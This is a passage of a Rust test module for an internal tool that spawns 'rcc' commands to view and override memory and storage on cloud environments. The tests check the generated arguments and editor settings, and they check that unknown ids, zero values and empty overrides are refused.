        cached(&store, "env_201kpvffchrm1sq5p0qph42dqev", "environment");
        let err = Request::KubeToken {
            install: "env_201kpvffchrm1sq5p0qph42dqev".into(),
            access_level: "support".into(),
            duration: "24h".into(),
        }
        .resolve(&cfg(), &store)
        .unwrap_err();
        assert!(format!("{err:#}").contains("not a Nuon install"));
    }

    /// The command actually exists, and the figures ride on the **editor**, not on `rcc`.
    ///
    /// This test replaces one that asserted `["override", id, "--memory", "24", …]`. `rcc` has
    /// no `override` subcommand and never has — it printed its usage and exited 1 every time
    /// the button was pressed, while the test went on passing, because it checked the argv
    /// this code *built* rather than anything about the tool it was building it for. So the
    /// assertion is now on the two things that make it work: the subcommand `rcc` really has,
    /// and an `$EDITOR` that is this binary rather than an interactive one.
    #[test]
    fn setting_resources_edits_the_document_through_rccs_own_write_path() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "env_201kpvffchrm1sq5p0qph42dqev", "environment");
        let spawn = Request::RccOverride {
            id: "env_201kpvffchrm1sq5p0qph42dqev".into(),
            memory_gib: Some(24),
            storage_gib: Some(128),
        }
        .resolve(&cfg(), &store)
        .unwrap();
        assert_eq!(spawn.program, "/bin/rcc");
        assert_eq!(
            spawn.args,
            vec!["edit", "env_201kpvffchrm1sq5p0qph42dqev", "-c", "us"]
        );

        // Both, because `rcc` prefers VISUAL and falls back to EDITOR — leaving either one
        // interactive would park the pane in a text editor nobody is driving.
        let editor: Vec<&str> = spawn
            .env
            .iter()
            .filter(|(k, _)| k == "VISUAL" || k == "EDITOR")
            .map(|(_, v)| v.as_str())
            .collect();
        assert_eq!(editor.len(), 2);
        for spec in &editor {
            assert!(spec.contains("cloud-set-resources"), "{spec}");
            assert!(spec.ends_with("--memory 24 --storage 128"), "{spec}");
            // Whitespace-split by `rcc`, so the figures have to be their own words and the
            // binary path its own single one.
            assert_eq!(spec.split_whitespace().count(), 6, "{spec}");
        }

        // The confirmation is the point: a resource change nobody read back is the failure
        // this is designed against, exactly as for reconcile.
        assert!(!spawn.args.iter().any(|a| a == "-y" || a == "--yes"));
    }

    /// Either field alone is a legitimate change; the other is left as it is.
    #[test]
    fn an_override_may_set_just_one_of_the_two() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "env_201kpvffchrm1sq5p0qph42dqev", "environment");
        let only_storage = Request::RccOverride {
            id: "env_201kpvffchrm1sq5p0qph42dqev".into(),
            memory_gib: None,
            storage_gib: Some(64),
        }
        .resolve(&cfg(), &store)
        .unwrap();
        let editor = &only_storage
            .env
            .iter()
            .find(|(k, _)| k == "VISUAL")
            .unwrap()
            .1;
        assert!(!editor.contains("--memory"), "{editor}");
        assert!(editor.ends_with("--storage 64"), "{editor}");
        assert_eq!(
            only_storage.label,
            "rcc edit env_201kpvffchrm1sq5p0qph42dqev · storage 64Gi"
        );
    }

    /// A tier is a floor, not a ceiling. An override exists to exceed what the plan provisions,
    /// so a figure larger than the biggest published profile is an ordinary request — the
    /// largest today is 3072 GiB of storage and 110 GiB of memory.
    #[test]
    fn an_override_is_not_capped_by_anything_a_tier_provides() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "env_201kpvffchrm1sq5p0qph42dqev", "environment");
        let spawn = Request::RccOverride {
            id: "env_201kpvffchrm1sq5p0qph42dqev".into(),
            memory_gib: Some(2048),
            storage_gib: Some(65536),
        }
        .resolve(&cfg(), &store)
        .unwrap();
        let editor = &spawn.env.iter().find(|(k, _)| k == "VISUAL").unwrap().1;
        assert!(
            editor.ends_with("--memory 2048 --storage 65536"),
            "{editor}"
        );
    }

    /// Zero is not a smaller override, it is a broken one.
    #[test]
    fn an_override_of_zero_is_refused() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "env_201kpvffchrm1sq5p0qph42dqev", "environment");
        for (memory_gib, storage_gib, want) in
            [(Some(0), None, "memory"), (None, Some(0), "storage")]
        {
            let err = Request::RccOverride {
                id: "env_201kpvffchrm1sq5p0qph42dqev".into(),
                memory_gib,
                storage_gib,
            }
            .resolve(&cfg(), &store)
            .unwrap_err();
            let msg = format!("{err:#}");
            assert!(msg.contains(want), "{msg}");
            assert!(msg.contains("greater than zero"), "{msg}");
        }
    }

    /// A button labelled "apply" that applies nothing is a bug report, not a no-op.
    #[test]
    fn an_override_with_neither_field_is_refused() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "env_201kpvffchrm1sq5p0qph42dqev", "environment");
        let err = Request::RccOverride {
            id: "env_201kpvffchrm1sq5p0qph42dqev".into(),
            memory_gib: None,
            storage_gib: None,
        }
        .resolve(&cfg(), &store)
        .unwrap_err();
        assert!(format!("{err:#}").contains("nothing to change"));
    }

    /// Only environments have a volume and a pod to size.
    #[test]
    fn only_an_environment_has_resource_overrides() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "acc_201kpvffchrm1sq5p0qph42dqev", "account");
        let err = Request::RccOverride {
            id: "acc_201kpvffchrm1sq5p0qph42dqev".into(),
            memory_gib: Some(8),
            storage_gib: None,
        }
        .resolve(&cfg(), &store)
        .unwrap_err();
        assert!(format!("{err:#}").contains("apply to environments"));
    }

    /// `view json` runs the real command, and any cached id is readable.
    #[test]
    fn a_get_reads_any_cached_entity_verbatim() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "env_201kpvffchrm1sq5p0qph42dqev", "environment");
        cached(&store, "rgn_201kpvffchrm1sq5p0qph42dqev", "region");
        for id in [
            "env_201kpvffchrm1sq5p0qph42dqev",
            // A region is deliberately not editable, and just as deliberately readable.
            "rgn_201kpvffchrm1sq5p0qph42dqev",
        ] {
            let spawn = Request::RccGet { id: id.into() }
                .resolve(&cfg(), &store)
                .unwrap();
            assert_eq!(spawn.program, "/bin/rcc");
            assert_eq!(spawn.args, vec!["get", id, "-c", "us"]);
        }
    }

    /// Reading is not a way to probe the estate for ids that exist.
    #[test]
    fn a_get_of_an_unknown_id_is_refused() {
        let store = Store::open_in_memory().unwrap();
        let err = Request::RccGet {
            id: "env_201kpvffchrm1sq5p0qph42dqev".into(),
        }
        .resolve(&cfg(), &store)
        .unwrap_err();
        assert!(format!("{err:#}").contains("not in the entity cache"));
    }

    /// The exact JSON the browser sends, through serde and out as argv. Guards the wire
    /// contract between `PtyRequest` in Terminal.tsx and this enum — a renamed field would
    /// otherwise fail only at runtime, in a terminal, in front of a customer environment.
    #[test]
    fn the_browsers_json_deserialises_into_the_request() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "env_201kpvffchrm1sq5p0qph42dqev", "environment");
        let req: Request = serde_json::from_str(
            r#"{"kind":"rcc_override","id":"env_201kpvffchrm1sq5p0qph42dqev","memory_gib":16,"storage_gib":64}"#,
        )
        .unwrap();
        let spawn = req.resolve(&cfg(), &store).unwrap();
        // The GiB figures now ride on the editor rather than on `rcc`'s argv — but they still
        // have to survive the wire, which is what this test is for.
        let editor = &spawn.env.iter().find(|(k, _)| k == "VISUAL").unwrap().1;
        assert!(editor.ends_with("--memory 16 --storage 64"), "{editor}");
        assert_eq!(
            spawn.args,
            vec!["edit", "env_201kpvffchrm1sq5p0qph42dqev", "-c", "us"]
        );

        // An omitted field is "leave it alone", which is how the modal sends a blank box.
        let req: Request = serde_json::from_str(
            r#"{"kind":"rcc_override","id":"env_201kpvffchrm1sq5p0qph42dqev","storage_gib":512}"#,
        )
        .unwrap();
        let spawn = req.resolve(&cfg(), &store).unwrap();
        let editor = &spawn.env.iter().find(|(k, _)| k == "VISUAL").unwrap().1;
        assert!(!editor.contains("--memory"), "{editor}");
        assert!(editor.ends_with("--storage 512"), "{editor}");
    }

    /// Same rule as edit and reconcile: the estate must already know the id.
    #[test]
    fn an_override_of_an_unknown_environment_is_refused() {
        let store = Store::open_in_memory().unwrap();
        let err = Request::RccOverride {
            id: "env_201kpvffchrm1sq5p0qph42dqev".into(),
            memory_gib: Some(8),
            storage_gib: None,
        }
        .resolve(&cfg(), &store)
        .unwrap_err();
        assert!(format!("{err:#}").contains("not in the entity cache"));
    }
}
